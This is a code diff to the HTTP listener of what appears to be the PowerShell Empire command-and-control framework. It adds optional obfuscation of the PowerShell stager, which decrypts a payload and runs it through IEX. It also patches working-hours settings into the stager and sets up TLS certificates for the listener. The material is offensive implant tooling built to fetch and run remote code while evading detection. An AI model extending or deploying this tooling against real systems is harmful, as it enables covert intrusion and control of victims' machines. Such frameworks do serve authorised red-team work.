@@ -2,6 +2,7 @@ import logging
 import base64
 import random
 import os
+import ssl
 import time
 import copy
 from pydispatch import dispatcher
@@ -151,7 +152,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -226,9 +227,11 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                if obfuscate:
+                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
-                    return helpers.powershell_launcher(stager)
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
+                    return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
                     return stager
@@ -252,6 +255,7 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
         folder = listenerOptions['Folder']['Value']
 
         if language.lower() == 'powershell':
@@ -268,6 +272,10 @@ class Listener:
             # patch the server and key information
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
             stager = stager.replace('REPLACE_FOLDER', folder)
+
+            #patch in working hours if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             randomizedStager = ''
 
@@ -309,8 +317,8 @@ class Listener:
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
         killDate = listenerOptions['KillDate']['Value']
-        workingHours = listenerOptions['WorkingHours']['Value']
         folder = listenerOptions['Folder']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
@@ -337,8 +345,6 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if workingHours != "":
-                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
 
             return code
         else:
@@ -591,7 +597,9 @@ class Listener:
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                certPath = os.path.abspath(certPath)
+                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
